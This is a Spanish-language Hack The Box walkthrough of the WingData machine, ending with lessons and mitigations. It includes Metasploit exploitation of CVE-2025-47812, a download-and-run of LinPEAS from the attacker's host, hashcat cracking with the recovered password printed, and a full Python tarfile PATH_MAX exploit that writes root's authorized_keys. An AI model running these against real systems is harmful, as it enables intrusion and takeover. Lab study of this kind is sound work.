---
title: "HTB Walkthrough: WingData"
date: 2026-03-28
draft: false
description: "Walkthrough completo de la máquina WingData de Hack The Box. Dificultad Easy, OS Linux. RCE en Wing FTP Server mediante CVE-2025-47812 (NULL-byte Authentication Bypass) y escalada a root explotando un bypass de PATH_MAX en tarfile de Python."
tags: ["HackTheBox", "Linux", "Easy", "FTP", "WingFTP", "CVE-2025-47812", "NullByteBypass", "RCE", "Metasploit", "Hashcat", "SHA256", "tarfile", "PathTraversal", "PrivEsc", "SSH", "wingdata", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **WingData** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Linux**. RCE mediante CVE-2025-47812, un bypass de autenticación por byte nulo en Wing FTP Server que otorga acceso al panel de administración y ejecución de código remota. Tras crackear credenciales de usuario con hashcat (SHA-256 con salt), escalamos a root explotando un bypass de `PATH_MAX` en el módulo `tarfile` de Python ejecutado con privilegios `sudo`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                              |
|----------------|--------------------------------------------------------------------------------------|
| **Nombre**     | WingData                                                                             |
| **OS**         | Linux (Debian 12)                                                                    |
| **Dificultad** | Easy                                                                                 |
| **IP**         | 10.129.10.66                                                                         |
| **Técnicas**   | CVE-2025-47812 · NULL-byte Auth Bypass · SHA-256 Salted Hash · tarfile PATH_MAX PrivEsc |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -sV 10.129.10.66
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

*Puertos abiertos:*
- `22` → OpenSSH 9.2p1, sin exploits públicos conocidos para este release. Lo guardamos como entrada posible si obtenemos credenciales válidas.
- `80` → Apache 2.4.66; puede haber paneles de administración o redirecciones a subdominios adicionales.

Lanzamos un segundo escaneo con `-sC` (scripts por defecto de nmap) sobre el puerto 80 para detectar redirecciones y metadatos:

```bash
nmap -sC 10.129.10.66 -p80
```

```
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Did not follow redirect to http://wingdata.htb/
```

El servidor redirige a `http://wingdata.htb/`. Esto indica **Virtual Hosting basado en nombre de dominio**: el servidor Apache devuelve contenido diferente según el campo `Host:` de la cabecera HTTP. Si accedemos directamente por IP no obtendremos el contenido correcto.

Como en HTB no hay DNS que resuelva `wingdata.htb`, añadimos la entrada a `/etc/hosts` para que nuestro sistema la resuelva localmente:

```bash
sudo sh -c "echo '10.129.10.66 wingdata.htb' >> /etc/hosts"
```

Verificamos con `curl -I` (petición HEAD, solo cabeceras) que el servidor responde correctamente:

```bash
curl -I http://wingdata.htb/
```

```
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
Content-Length: 12492
Content-Type: text/html
```

---

## 2. Análisis de Servicios y Enumeración Manual

### 2.1 Descubrimiento del Subdominio FTP

Explorando la página web de `wingdata.htb`, el botón "Client Portal" redirige a `ftp.wingdata.htb`. Actualizamos `/etc/hosts` para incluir ambos dominios en la misma línea:

```bash
sudo sh -c "echo '10.129.10.66 wingdata.htb ftp.wingdata.htb' >> /etc/hosts"
```

Al acceder a `http://ftp.wingdata.htb/`, encontramos un cliente FTP web — **Wing FTP Server** con interfaz web. Probamos `anonymous:anonymous`; el servidor nos deja entrar pero no muestra archivos en el directorio raíz.

### 2.2 Enumeración de Directorios con Gobuster

Con el acceso anónimo vacío, usamos Gobuster para descubrir rutas mediante fuerza bruta de diccionario:

```bash
gobuster dir -u http://ftp.wingdata.htb -w /usr/share/wordlists/dirb/common.txt
```

```
/crossdomain.xml   (Status: 200) [Size: 111]
/css               (Status: 200) [Size: 0]
/favicon.ico       (Status: 200) [Size: 19790]
/help              (Status: 500) [Size: 0]
/icons             (Status: 500) [Size: 0]
/images            (Status: 500) [Size: 0]
/include           (Status: 500) [Size: 0]
/language          (Status: 500) [Size: 0]
/plugins           (Status: 500) [Size: 0]
```

`crossdomain.xml` es el único con contenido real. Lo inspeccionamos:

```bash
curl http://ftp.wingdata.htb/crossdomain.xml
```

```xml
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="localhost" />
</cross-domain-policy>
```

> **💡 Dato clave:** El servidor solo confía en peticiones de `localhost`. Esto indica que el panel de administración de Wing FTP probablemente está restringido al acceso local — necesitaremos un foothold en la máquina para llegar a él, o bien una vulnerabilidad que no requiera acceder al panel desde fuera.

### 2.3 Puerto de Administración de Wing FTP

Wing FTP Server usa el puerto `5466` para su panel de administración web. Comprobamos si está expuesto:

```bash
nmap -p 5466 ftp.wingdata.htb
```

```
PORT     STATE    SERVICE
5466/tcp filtered unknown
```

Filtrado desde el exterior — confirmado que el panel está limitado a acceso local. El vector de entrada pasa por explotar directamente el servicio web.

---

## 3. Explotación — CVE-2025-47812 (NULL-byte Authentication Bypass)

### 3.1 Búsqueda de Exploit en Metasploit

```bash
msf6 > search Wing FTP
```

```
21  exploit/windows/ftp/wing_ftp_admin_exec      2014-06-19  excellent  Yes
22  exploit/multi/http/wingftp_null_byte_rce     2025-06-30  excellent  Yes  Wing FTP Server NULL-byte Authentication Bypass (CVE-2025-47812)
```

El módulo 22 coincide exactamente. CVE-2025-47812 es un **NULL-byte Authentication Bypass**: el servidor procesa incorrectamente bytes nulos (`\x00`) en el campo usuario o contraseña durante la autenticación HTTP, permitiendo saltarse el control de acceso al panel administrativo. Desde ese panel, Wing FTP permite ejecutar scripts Lua — ejecución de código remota directa.

### 3.2 Configuración y Verificación del Exploit

```bash
msf6 > use exploit/multi/http/wingftp_null_byte_rce
msf6 exploit(wingftp_null_byte_rce) > set RHOSTS 10.129.10.66
msf6 exploit(wingftp_null_byte_rce) > set LHOST tun0
msf6 exploit(wingftp_null_byte_rce) > check
```

```
[+] 10.129.10.66:80 - The target is vulnerable. Detected version 7.4.3 - 7.4.4
```

El objetivo es vulnerable. Lanzamos:

```bash
msf6 exploit(wingftp_null_byte_rce) > run
```

```
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.10.66:49312)
```

```bash
(Meterpreter 1)(/opt/wftpserver) > getuid
Server username: wingftp
```

✅ **Shell obtenida como `wingftp`** — el usuario del sistema operativo con el que corre el proceso de Wing FTP Server. Permisos limitados, pero suficientes para continuar.

---

## 4. Post-Explotación — Enumeración Interna con LinPEAS

### 4.1 Transferencia de LinPEAS

Descargamos LinPEAS en nuestra máquina atacante y lo servimos con el servidor HTTP de Python:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```

Desde la sesión Meterpreter, descargamos y ejecutamos en la máquina víctima:

```bash
cd /tmp
wget http://10.10.15.237/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 4.2 Hallazgos Relevantes

LinPEAS reporta varios puntos de interés (socket DBus, socket de systemd con permisos `777`, herramientas `socat`/`nc`/`ssh` presentes) que no resultan ser el vector principal. La pista más importante: como somos `wingftp`, el vector más probable está en los propios archivos de configuración de Wing FTP Server, que pueden contener credenciales de otros usuarios del sistema.

---

## 5. Obtención de Credenciales — Cracking del Hash de Wing FTP

### 5.1 Localización del Archivo de Administradores

Wing FTP Server guarda sus credenciales en archivos XML dentro de `/opt/wftpserver`. En `_ADMINISTRATOR/admins.xml` encontramos:

```xml
<ADMIN>
    <Admin_Name>admin</Admin_Name>
    <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
</ADMIN>
```

64 caracteres hexadecimales → SHA-256. Intentamos crackearlo con John:

```bash
echo "a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba" > hash.txt
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Sin resultados — el fallo se revela investigando más archivos de configuración.

### 5.2 Descubrimiento del Salt

En el archivo de configuración del dominio (`Data/1`) encontramos:

```xml
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

El hash se calcula como `SHA256(password + "WingFTP")`, no simplemente `SHA256(password)`. Las rainbow tables y el cracking básico no sirven sin incorporar el salt.

### 5.3 Cracking del Hash del Usuario `wacky`

El usuario `wacky` es el único con directorio en `/home`, lo que indica que es un usuario real del sistema. Su hash en la configuración de Wing FTP:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

Usamos hashcat con el modo `1410` (`SHA256($pass.$salt)`):

```bash
hashcat -m 1410 "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" \
  /usr/share/wordlists/rockyou.txt
```

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

> **🔑 Credenciales encontradas:** `wacky:!#7Blushing^*Bride5`

---

## 6. Acceso SSH y Flag de Usuario

Con las credenciales obtenidas, nos conectamos por SSH — más estable e interactivo que la shell de Meterpreter, y no depende de que el proceso de Metasploit siga corriendo:

```bash
ssh wacky@10.129.10.66
```

```bash
wacky@wingdata:~$ ls
user.txt
wacky@wingdata:~$ cat user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 7. Escalada de Privilegios — tarfile PATH_MAX Bypass

### 7.1 Enumeración de Permisos sudo

```bash
wacky@wingdata:~$ sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Podemos ejecutar `restore_backup_clients.py` como root sin contraseña. El asterisco al final permite pasarle cualquier argumento — un vector clásico cuando el script tiene alguna vulnerabilidad en su lógica.

### 7.2 Análisis del Entorno

```bash
ls -la /opt/backup_clients/
```

```
drwxr-x--- 4 root wacky 4096 .
drwxr-xr-x 4 root root  4096 ..
drwxrwx--- 2 root wacky 4096 backups
-rwxr-x--- 1 root wacky 2829 restore_backup_clients.py
drwxr-x--- 2 root wacky 4096 restored_backups
```

El directorio `backups/` tiene permisos `rwxrwx---` — el grupo `wacky` puede escribir en él. Podemos colocar un `.tar` malicioso que el script procesará con privilegios de root.

### 7.3 Identificación de la Vulnerabilidad en el Script

El bloque crítico de `restore_backup_clients.py`:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

Aunque `filter="data"` (introducido en Python 3.12) bloquea el Path Traversal clásico, la implementación tiene un fallo: cuando la ruta completa de extracción supera el límite `PATH_MAX` (4096 bytes en Linux), el kernel trunca la resolución de la ruta. Combinando esto con symlinks cuidadosamente construidos dentro del tar, el proceso puede escribir en rutas arbitrarias del sistema — como `/root/.ssh/authorized_keys`.

### 7.4 Preparación del Payload SSH

Generamos un par de claves RSA en la máquina víctima:

```bash
ssh-keygen -t rsa -f /tmp/id_rsa -N ""
```

### 7.5 El Exploit — Construcción del `.tar` Malicioso

La técnica funciona en cuatro fases dentro del archivo TAR:

```
Fase 1: Estructura de directorios anidados con nombres de 247 chars (v×247)
        + symlinks cortos por nivel → ruta total supera PATH_MAX

Fase 2: "Pivot" — symlink con nombre de 254 chars que apunta ../×N
        para volver a la raíz de la ruta de extracción

Fase 3: Symlink "trigger_link" → la ruta total supera PATH_MAX y el kernel
        trunca la resolución → trigger_link apunta a /root/.ssh/

Fase 4: archivo authorized_keys referenciado via trigger_link
        → root extrae y escribe nuestra clave en /root/.ssh/
```

Guardamos el exploit como `/tmp/exploit.py`:

```python
#!/usr/bin/env python3
import tarfile
import io
import os
import argparse
from dataclasses import dataclass

MAX_DIR_NAME = 247
NESTING_LEVELS = "123456789abcdefg"
EXTENDED_LINK_SIZE = 254

@dataclass
class ExploitConfig:
    output_tar: str
    target_path: str
    content: bytes
    permissions: int = 0o644

class TarExploitBuilder:
    def __init__(self, config: ExploitConfig):
        self.cfg = config
        self.current_depth = ""

    def generate(self):
        long_name = "v" * MAX_DIR_NAME
        with tarfile.open(self.cfg.output_tar, "w") as archive:
            for char in NESTING_LEVELS:
                dir_info = tarfile.TarInfo(name=os.path.join(self.current_depth, long_name))
                dir_info.type = tarfile.DIRTYPE
                archive.addfile(dir_info)

                link_info = tarfile.TarInfo(name=os.path.join(self.current_depth, char))
                link_info.type = tarfile.SYMTYPE
                link_info.linkname = long_name
                archive.addfile(link_info)

                self.current_depth = os.path.join(self.current_depth, long_name)

            short_path_chain = "/".join(NESTING_LEVELS)
            pivot_path = os.path.join(short_path_chain, "z" * EXTENDED_LINK_SIZE)

            pivot = tarfile.TarInfo(name=pivot_path)
            pivot.type = tarfile.SYMTYPE
            pivot.linkname = "../" * len(NESTING_LEVELS)
            archive.addfile(pivot)

            dest_dir = os.path.dirname(self.cfg.target_path)
            dest_file = os.path.basename(self.cfg.target_path)
            escape_route = f"{pivot_path}/{'../' * 8}{dest_dir.lstrip('/')}"

            escape_link = tarfile.TarInfo(name="trigger_link")
            escape_link.type = tarfile.SYMTYPE
            escape_link.linkname = escape_route
            archive.addfile(escape_link)

            payload_entry = tarfile.TarInfo(name=f"trigger_link/{dest_file}")
            payload_entry.size = len(self.cfg.content)
            payload_entry.mode = self.cfg.permissions
            archive.addfile(payload_entry, fileobj=io.BytesIO(self.cfg.content))

        print(f"[*] Archivo generado: {self.cfg.output_tar}")
        print(f"[*] Objetivo: {self.cfg.target_path}")

def run():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--output", required=True)
    parser.add_argument("-t", "--target", default="/root/.ssh/authorized_keys")
    parser.add_argument("-p", "--payload", required=True)
    args = parser.parse_args()

    with open(args.payload, "rb") as f:
        data = f.read()
        if not data.endswith(b"\n"):
            data += b"\n"

    config = ExploitConfig(
        output_tar=args.output,
        target_path=args.target,
        content=data,
        permissions=0o600 if "ssh" in args.target else 0o644
    )
    TarExploitBuilder(config).generate()

if __name__ == "__main__":
    run()
```

### 7.6 Ejecución del Ataque

Generamos el tar malicioso apuntando a `/root/.ssh/authorized_keys`:

```bash
python3 /tmp/exploit.py \
  -o /opt/backup_clients/backups/evil.tar \
  -t /root/.ssh/authorized_keys \
  -p /tmp/id_rsa.pub
```

Ejecutamos el script de restauración como root con nuestro tar malicioso:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py evil.tar
```

Verificamos que la escalada funcionó:

```bash
wacky@wingdata:/tmp$ sudo -l
    (ALL) NOPASSWD: ALL
```

Nos convertimos en root:

```bash
wacky@wingdata:/tmp$ sudo su -
root@wingdata:~#
```

✅ **Escalada a root completada.**

---

## 8. Root Flag

```bash
root@wingdata:~# cat root.txt
```

> 🏁 Flag de root obtenida.

---

## 9. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Virtual hosting a `wingdata.htb`; subdominio `ftp.wingdata.htb` con Wing FTP Server 7.4.3.
2. **Enumeración** → `crossdomain.xml` revela que el panel admin solo acepta `localhost`; puerto 5466 filtrado; acceso anónimo FTP vacío.
3. **CVE-2025-47812** → NULL-byte Auth Bypass en Wing FTP → Metasploit → shell como `wingftp`.
4. **LinPEAS** → Apunta a archivos de configuración de la aplicación como vector más probable.
5. **Cracking de hash** → `admins.xml` y config de usuarios → salt `WingFTP` → hashcat modo `1410` → `wacky:!#7Blushing^*Bride5`.
6. **SSH** → Acceso como `wacky` → user flag.
7. **PrivEsc** → `sudo` sin contraseña sobre script Python que extrae tarballs → tarfile PATH_MAX bypass → escritura en `/root/.ssh/authorized_keys` → root.

**Lo que aprendí con esta máquina:**

- **El Virtual Hosting exige añadir dominios a `/etc/hosts` en HTB.** Un 302 a un nombre de dominio en el primer nmap es la señal — sin esa entrada, todas las peticiones al servidor web devuelven contenido incorrecto o un 404.

- **`crossdomain.xml` como pista del diseñador.** En CTF, un archivo de política que solo permite `localhost` es casi siempre un indicio de que el vector pasa por la propia máquina — ya sea SSRF, ejecución de código, o un panel de admin restringido internamente.

- **CVE-2025-47812 ilustra el riesgo del NULL-byte en parsers de autenticación.** Un byte nulo (`\x00`) en lenguajes como C termina una cadena, mientras que en Python o Lua no tiene ese significado. Cuando el código C subyacente y el código de aplicación interpretan la misma cadena de forma diferente, el atacante puede explotar esa discrepancia para saltarse controles.

- **El modo `1410` de hashcat es crítico para SHA-256 con salt.** Hashcat tiene más de 300 modos — usar el equivocado significa que nunca encontrará la contraseña aunque esté en el diccionario. Identificar el algoritmo y el formato de salt primero (leyendo la configuración de la aplicación) es el paso que define si el cracking tiene éxito o no.

- **`tarfile` con `filter="data"` no es suficiente en Python con rutas que superan `PATH_MAX`.** El filtro `data` bloquea ataques triviales de path traversal, pero el límite de longitud de ruta del kernel (`PATH_MAX = 4096`) puede ser explotado para hacer que la resolución de symlinks "caiga" fuera del directorio de extracción. La defensa correcta es no permitir que procesos privilegiados extraigan archivos proporcionados por el usuario.

- **`sudo` sobre scripts con argumentos de usuario y permisos de escritura en el directorio de entrada es privesc garantizada.** Si el usuario puede escribir en el directorio de donde lee el script, puede controlar completamente la entrada. El asterisco en la regla sudo no añade restricción real — cualquier nombre de archivo es válido.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| CVE-2025-47812 en Wing FTP 7.4.3-7.4.4 | Actualizar Wing FTP Server a la versión parcheada |
| Acceso anónimo FTP activo | Deshabilitar si no es necesario; aislar en chroot si se mantiene |
| Hash SHA-256 con salt estático y conocido | Usar salt aleatorio por usuario; considerar bcrypt o Argon2 |
| `sudo` sobre script que extrae tarballs de usuario | Ejecutar con usuario de servicio dedicado sin acceso a rutas del sistema; validar el contenido del tar antes de extraer |
| Escritura en directorio de entrada del script privilegiado | Restringir permisos del directorio `backups/` solo al usuario de servicio |
| Python desactualizado con `tarfile` vulnerable | Actualizar Python a versión con corrección del bypass PATH_MAX; no usar `extractall` sobre archivos no confiables |
